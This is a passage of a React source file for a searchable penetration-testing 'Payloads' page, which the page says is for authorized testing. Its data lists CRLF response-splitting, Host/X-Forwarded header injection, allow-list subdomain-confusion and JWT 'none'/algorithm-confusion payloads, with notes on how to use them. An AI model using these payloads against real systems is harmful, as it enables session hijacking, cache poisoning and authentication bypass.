                    { payload: `https://trusted.example.evil.example`, lang: 'text', note: 'Subdomain confusion against substring-based allow-lists.' },
                ],
            },
        ],
    },
    {
        id: 'crlf',
        name: 'CRLF / Header Injection',
        icon: <Terminal size={15} />,
        accent: 'red',
        blurb: 'Response-splitting and header-injection payloads for request/response manipulation.',
        groups: [
            {
                title: 'Response splitting',
                items: [
                    { payload: `%0d%0aSet-Cookie:%20session=evil`, lang: 'text', note: 'URL-encoded CRLF to inject a header.' },
                    { payload: `%0d%0a%0d%0a<html>injected</html>`, lang: 'text', note: 'Double CRLF to inject a full body after the headers.' },
                    { payload: `\\r\\nSet-Cookie: evil=1`, lang: 'text', tags: ['raw'] },
                ],
            },
        ],
    },
    {
        id: 'host',
        name: 'Host Header Injection',
        icon: <Globe size={15} />,
        accent: 'indigo',
        blurb: 'Manipulated Host/X-Forwarded headers for cache poisoning, SSRF and password-reset abuse.',
        groups: [
            {
                title: 'Header payloads',
                items: [
                    { payload: `Host: evil.example`, lang: 'http' },
                    { payload: `X-Forwarded-Host: evil.example`, lang: 'http' },
                    { payload: `X-Forwarded-Server: evil.example`, lang: 'http' },
                    { payload: `Host: target.example:evil.example`, lang: 'http', note: 'Port-confusion variant some proxies mis-parse.' },
                ],
            },
        ],
    },
    {
        id: 'jwt',
        name: 'JWT Attacks',
        icon: <KeyRound size={15} />,
        accent: 'yellow',
        blurb: 'Signature and algorithm-confusion attacks against JSON Web Tokens.',
        groups: [
            {
                title: '"none" algorithm',
                items: [
                    { payload: `{"alg":"none","typ":"JWT"}`, lang: 'json', note: 'Base64url-encode this as the header, drop the signature, and some libraries still accept it.' },
                ],
            },
            {
                title: 'Algorithm confusion (RS256 → HS256)',
                items: [
                    { payload: `{"alg":"HS256","typ":"JWT"}`, lang: 'json', note: "Re-sign with the server's public RSA key used as an HMAC secret, if the verifier doesn't pin the algorithm." },
                ],
            },
        ],
    },
];

// ─── Shared style tokens ────────────────────────────────────────────────────

const PANEL = 'rounded-2xl border border-white/[0.08] bg-[#141416]';
const FOCUS_RING =
    'focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-emerald-400/60';
const ICON_BTN =
    `rounded-md p-1.5 text-[#858592] transition hover:bg-white/[0.08] hover:text-white ${FOCUS_RING}`;

// Accent → classes, so each category reads distinctly at a glance.
const ACCENT_CLASSES: Record<string, { icon: string; chip: string; ring: string }> = {
    emerald: { icon: 'border-emerald-400/20 bg-emerald-400/[0.08] text-emerald-300', chip: 'border-emerald-400/30 bg-emerald-400/[0.1] text-emerald-300', ring: 'hover:border-emerald-400/25' },
    amber: { icon: 'border-amber-400/20 bg-amber-400/[0.08] text-amber-300', chip: 'border-amber-400/30 bg-amber-400/[0.1] text-amber-300', ring: 'hover:border-amber-400/25' },
    rose: { icon: 'border-rose-400/20 bg-rose-400/[0.08] text-rose-300', chip: 'border-rose-400/30 bg-rose-400/[0.1] text-rose-300', ring: 'hover:border-rose-400/25' },
    sky: { icon: 'border-sky-400/20 bg-sky-400/[0.08] text-sky-300', chip: 'border-sky-400/30 bg-sky-400/[0.1] text-sky-300', ring: 'hover:border-sky-400/25' },
    violet: { icon: 'border-violet-400/20 bg-violet-400/[0.08] text-violet-300', chip: 'border-violet-400/30 bg-violet-400/[0.1] text-violet-300', ring: 'hover:border-violet-400/25' },
    orange: { icon: 'border-orange-400/20 bg-orange-400/[0.08] text-orange-300', chip: 'border-orange-400/30 bg-orange-400/[0.1] text-orange-300', ring: 'hover:border-orange-400/25' },
    cyan: { icon: 'border-cyan-400/20 bg-cyan-400/[0.08] text-cyan-300', chip: 'border-cyan-400/30 bg-cyan-400/[0.1] text-cyan-300', ring: 'hover:border-cyan-400/25' },
    fuchsia: { icon: 'border-fuchsia-400/20 bg-fuchsia-400/[0.08] text-fuchsia-300', chip: 'border-fuchsia-400/30 bg-fuchsia-400/[0.1] text-fuchsia-300', ring: 'hover:border-fuchsia-400/25' },
    lime: { icon: 'border-lime-400/20 bg-lime-400/[0.08] text-lime-300', chip: 'border-lime-400/30 bg-lime-400/[0.1] text-lime-300', ring: 'hover:border-lime-400/25' },
    teal: { icon: 'border-teal-400/20 bg-teal-400/[0.08] text-teal-300', chip: 'border-teal-400/30 bg-teal-400/[0.1] text-teal-300', ring: 'hover:border-teal-400/25' },
    red: { icon: 'border-red-400/20 bg-red-400/[0.08] text-red-300', chip: 'border-red-400/30 bg-red-400/[0.1] text-red-300', ring: 'hover:border-red-400/25' },
    indigo: { icon: 'border-indigo-400/20 bg-indigo-400/[0.08] text-indigo-300', chip: 'border-indigo-400/30 bg-indigo-400/[0.1] text-indigo-300', ring: 'hover:border-indigo-400/25' },
    yellow: { icon: 'border-yellow-400/20 bg-yellow-400/[0.08] text-yellow-300', chip: 'border-yellow-400/30 bg-yellow-400/[0.1] text-yellow-300', ring: 'hover:border-yellow-400/25' },
};

// ─── Code-editor-style payload block ─────────────────────────────────────────

function PayloadBlock({
    item, rowId, copiedId, onCopy, accent,
}: {
    item: PayloadItem;
    rowId: string;
    copiedId: string | null;
    onCopy: (id: string, text: string) => void;
    accent: string;
}) {
    const isCopied = copiedId === rowId;
    const ring = ACCENT_CLASSES[accent]?.ring ?? '';

    return (
        <div>
            {/* Editor chrome: mac-style dots, language label, copy button */}
            <div
                className={`overflow-hidden rounded-xl border border-black/60 bg-[#0a0a0b] shadow-inner shadow-black/40 transition ${ring}`}
            >
                <div className="flex h-9 items-center gap-2.5 border-b border-white/[0.06] bg-[#111113] px-3.5">
                    <span className="flex items-center gap-1.5">
                        <span className="h-2.5 w-2.5 rounded-full bg-[#ff5f57]/70" />
                        <span className="h-2.5 w-2.5 rounded-full bg-[#febc2e]/70" />
                        <span className="h-2.5 w-2.5 rounded-full bg-[#28c840]/70" />
                    </span>
                    <span className={`${mono.className} text-[11px] font-medium lowercase tracking-wide text-[#6c6c78]`}>
                        {item.lang ?? 'text'}
                    </span>
                    <div className="flex-1" />
                    <button
                        type="button"
                        onClick={() => onCopy(rowId, item.payload)}
                        title="Copy payload"
                        aria-label="Copy payload"
                        className={`flex items-center gap-1.5 rounded-md px-2 py-1 text-[11px] font-medium transition ${FOCUS_RING} ${isCopied
                                ? 'text-emerald-400'
                                : 'text-[#858592] hover:bg-white/[0.08] hover:text-white'
                            }`}
                    >
                        {isCopied ? <Check size={13} /> : <Copy size={13} />}
                        {isCopied ? 'Copied' : 'Copy'}
                    </button>
                </div>

                <pre className="overflow-x-auto px-4 py-3.5 [scrollbar-color:rgba(255,255,255,0.14)_transparent] [scrollbar-width:thin]">
                    <code
                        className={`${mono.className} block whitespace-pre break-words text-[12.5px] leading-6 text-[#d7f4e6]`}
                    >
                        {item.payload}
                    </code>
                </pre>
            </div>

            {/* Explanation lives below the block, not inside it */}
            {(item.note || (item.tags && item.tags.length > 0)) && (
                <div className="mt-1.5 flex flex-wrap items-start gap-x-2.5 gap-y-1 px-0.5">
                    {item.note && (
                        <p className="flex items-start gap-1.5 text-[12px] leading-5 text-[#8a8a96]">
                            <Info size={12} className="mt-0.5 shrink-0 text-[#5f5f6b]" />
                            {item.note}
                        </p>
                    )}
                    {item.tags && item.tags.length > 0 && (
                        <div className="flex flex-wrap gap-1">
                            {item.tags.map((tag) => (
                                <span
                                    key={tag}
                                    className="rounded-md border border-white/[0.08] bg-white/[0.04] px-1.5 py-0.5 text-[10px] font-medium uppercase tracking-wide text-[#8a8a98]"
                                >
                                    {tag}
                                </span>
                            ))}
                        </div>
                    )}
                </div>
            )}
        </div>
    );
}

// ─── Category section ─────────────────────────────────────────────────────────

function CategorySection({
    category, collapsed, onToggle, copiedId, onCopy,
}: {
    category: PayloadCategory;
    collapsed: boolean;
    onToggle: () => void;
    copiedId: string | null;
    onCopy: (id: string, text: string) => void;
}) {
    const totalItems = category.groups.reduce((n, g) => n + g.items.length, 0);
    const accent = ACCENT_CLASSES[category.accent] ?? ACCENT_CLASSES.emerald;

    return (
        <section className={`${PANEL} overflow-hidden`}>
            <button
                type="button"
                onClick={onToggle}
                aria-expanded={!collapsed}
                className={`flex w-full items-center gap-3 px-4 py-3.5 text-left transition hover:bg-white/[0.03] ${FOCUS_RING}`}
            >
                <span className={`flex h-9 w-9 shrink-0 items-center justify-center rounded-lg border ${accent.icon}`}>
                    {category.icon}
                </span>
                <div className="min-w-0 flex-1">
                    <p className="truncate text-[14.5px] font-semibold text-[#eeeef3]">{category.name}</p>
                    <p className="truncate text-[12px] text-[#83838f]">{category.blurb}</p>
                </div>
                <span className={`shrink-0 rounded-full border px-2.5 py-0.5 text-[11px] font-medium tabular-nums ${accent.chip}`}>
                    {totalItems}
                </span>
                <ChevronDown
                    size={16}
                    className={`shrink-0 text-[#6c6c78] transition-transform duration-150 motion-reduce:transition-none ${collapsed ? '' : 'rotate-180'
                        }`}
                />
            </button>

            {!collapsed && (
                <div className="space-y-5 border-t border-white/[0.07] px-4 py-5">
                    {category.groups.map((group) => (
                        <div key={group.title}>
                            <p className="mb-2.5 flex items-center gap-1.5 text-[11px] font-semibold uppercase tracking-wider text-[#6c6c78]">
                                <ChevronRight size={11} />
                                {group.title}
                            </p>
                            <div className="grid gap-3.5">
                                {group.items.map((item, idx) => {
                                    const rowId = `${category.id}:${group.title}:${idx}`;
                                    return (
                                        <PayloadBlock
                                            key={rowId}
                                            item={item}
                                            rowId={rowId}
                                            copiedId={copiedId}
                                            onCopy={onCopy}
                                            accent={category.accent}
                                        />
                                    );
                                })}
                            </div>
                        </div>
                    ))}
                </div>
            )}
        </section>
    );
}

// ─── Main page ─────────────────────────────────────────────────────────────────

export default function PayloadsPage() {
    const [query, setQuery] = useState('');
    const [activeCategory, setActiveCategory] = useState<string>('all');
    const [collapsedIds, setCollapsedIds] = useState<Set<string>>(new Set());
    const [copiedId, setCopiedId] = useState<string | null>(null);

    const normalizedQuery = query.trim().toLowerCase();

    const filtered = useMemo(() => {
        return CATEGORIES
            .filter((cat) => activeCategory === 'all' || cat.id === activeCategory)
            .map((cat) => {
                if (!normalizedQuery) return cat;
                const groups = cat.groups
                    .map((g) => ({
                        ...g,
                        items: g.items.filter((item) => {
                            const haystack = [
                                item.payload,
                                item.note ?? '',
                                item.lang ?? '',
                                g.title,
                                cat.name,
                                ...(item.tags ?? []),
                            ]
                                .join(' ')
                                .toLowerCase();
                            return haystack.includes(normalizedQuery);
                        }),
                    }))
                    .filter((g) => g.items.length > 0);
                return { ...cat, groups };
            })
            .filter((cat) => cat.groups.length > 0);
    }, [activeCategory, normalizedQuery]);

    const totalMatches = filtered.reduce(
        (n, cat) => n + cat.groups.reduce((m, g) => m + g.items.length, 0),
        0
    );

    function toggleCategory(id: string) {
        setCollapsedIds((prev) => {
            const next = new Set(prev);
            if (next.has(id)) next.delete(id);
            else next.add(id);
            return next;
        });
    }

    async function handleCopy(id: string, text: string) {
        try {
            await navigator.clipboard.writeText(text);
            setCopiedId(id);
            window.setTimeout(() => setCopiedId((cur) => (cur === id ? null : cur)), 1500);
        } catch {
            // Clipboard unavailable: nothing to do.
        }
    }

    return (
        <div className={`${sans.className} min-h-full bg-[#0c0c0e] text-[#e5e5ec]`}>
            {/* ============================ Header ============================ */}
            <div className="border-b border-white/[0.07] px-6 py-6 md:px-10">
                <div className="mx-auto flex max-w-7xl flex-wrap items-start justify-between gap-4">
                    <div>
                        <h1 className="text-2xl font-semibold tracking-tight text-[#eeeef3]">
                            Payloads
                        </h1>
                        <p className="mt-2 max-w-2xl text-sm leading-6 text-[#898995]">
                            A searchable library of common attack payloads by vulnerability
                            class, so you don&apos;t have to go dig them up online mid-test.
                            For use against systems you&apos;re authorized to test.
                        </p>
                    </div>

                    <div className="flex h-12 w-12 shrink-0 items-center justify-center rounded-xl border border-emerald-400/20 bg-emerald-400/[0.08]">
                        <ShieldAlert size={24} className="text-emerald-400" />
                    </div>
                </div>
            </div>

            <main className="mx-auto max-w-7xl px-6 py-6 md:px-10">
                {/* ========================== Search + filter ========================= */}
                <div className="flex flex-col gap-3 md:flex-row md:items-center">
                    <div className="relative w-full md:max-w-sm">
                        <Search
                            size={16}
                            aria-hidden="true"
                            className="pointer-events-none absolute left-3.5 top-1/2 -translate-y-1/2 text-[#6c6c78]"
                        />
                        <input
                            type="text"
                            value={query}
                            onChange={(e) => setQuery(e.target.value)}
                            placeholder="Search payloads, tags, notes…"
                            aria-label="Search payloads"
                            className="w-full rounded-xl border border-white/[0.08] bg-[#141416] py-2.5 pl-10 pr-9 text-sm text-[#e5e5ec] placeholder:text-[#6c6c78] focus:border-emerald-400/40 focus:outline-none focus:ring-1 focus:ring-emerald-400/40"
                        />
                        {query && (
                            <button
                                type="button"
                                onClick={() => setQuery('')}
                                aria-label="Clear search"
                                className="absolute right-2.5 top-1/2 -translate-y-1/2 rounded-md p-1 text-[#858592] transition hover:bg-white/[0.08] hover:text-white"
                            >
                                <X size={14} />
                            </button>
                        )}
                    </div>

                    <div
                        role="group"
                        aria-label="Filter by vulnerability class"
                        className="flex flex-1 items-center gap-2 overflow-x-auto pb-1 [scrollbar-width:none]"
                    >
                        <button
                            type="button"
                            onClick={() => setActiveCategory('all')}
                            aria-pressed={activeCategory === 'all'}
                            className={`inline-flex h-9 shrink-0 items-center gap-1.5 rounded-full border px-3.5 text-xs font-medium transition ${FOCUS_RING} ${activeCategory === 'all'
                                    ? 'border-emerald-400/30 bg-emerald-400/[0.1] text-emerald-300'
                                    : 'border-white/[0.1] bg-white/[0.04] text-[#c4c4ce] hover:bg-white/[0.08] hover:text-white'
                                }`}
                        >
                            <ListFilter size={13} />
                            All
                        </button>
                        {CATEGORIES.map((cat) => {
                            const active = activeCategory === cat.id;
                            const accent = ACCENT_CLASSES[cat.accent] ?? ACCENT_CLASSES.emerald;
                            return (
                                <button
                                    key={cat.id}
                                    type="button"
                                    onClick={() => setActiveCategory(cat.id)}
                                    aria-pressed={active}
                                    title={cat.name}
                                    className={`inline-flex h-9 shrink-0 items-center gap-1.5 rounded-full border px-3.5 text-xs font-medium transition ${FOCUS_RING} ${active
                                            ? accent.chip
                                            : 'border-white/[0.1] bg-white/[0.04] text-[#c4c4ce] hover:bg-white/[0.08] hover:text-white'
                                        }`}
                                >
                                    {cat.icon}
                                    {cat.name}
                                </button>
                            );
                        })}
                    </div>
                </div>

                <p className="mt-4 text-xs text-[#6c6c78]" aria-live="polite">
                    {totalMatches} {totalMatches === 1 ? 'payload' : 'payloads'}
                    {normalizedQuery ? ` matching "${query.trim()}"` : ''}
                </p>

                {/* ============================ Results ============================ */}
                {filtered.length > 0 ? (
                    <div className="mt-4 grid gap-3">
                        {filtered.map((cat) => (
                            <CategorySection
                                key={cat.id}
                                category={cat}
                                collapsed={collapsedIds.has(cat.id)}
                                onToggle={() => toggleCategory(cat.id)}
                                copiedId={copiedId}
                                onCopy={handleCopy}
                            />
                        ))}
                    </div>
                ) : (
                    <div className="mt-4 flex flex-col items-center rounded-2xl border border-dashed border-white/[0.1] bg-[#121315] px-6 py-16 text-center">
                        <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-white/[0.05]">
                            <Search size={22} className="text-[#a6a6b2]" />
                        </div>
                        <h2 className="mt-4 text-sm font-semibold text-[#e5e5ec]">
                            No payloads match your search
                        </h2>
                        <p className="mt-1.5 max-w-sm text-xs leading-5 text-[#858592]">
                            Try a different term, or clear the search and category filter.
                        </p>
                        <button
                            type="button"
                            onClick={() => { setQuery(''); setActiveCategory('all'); }}
                            className="mt-5 rounded-lg border border-white/[0.1] bg-white/[0.05] px-4 py-2 text-xs font-medium text-[#e0e0e8] transition hover:bg-white/[0.09]"
                        >
                            Clear filters
                        </button>
                    </div>
                )}

                <div className="pb-6 pt-14 text-center text-[11px] text-[#666672]">
                    PacketSniffer · Payloads
                </div>
            </main>
        </div>
    );
}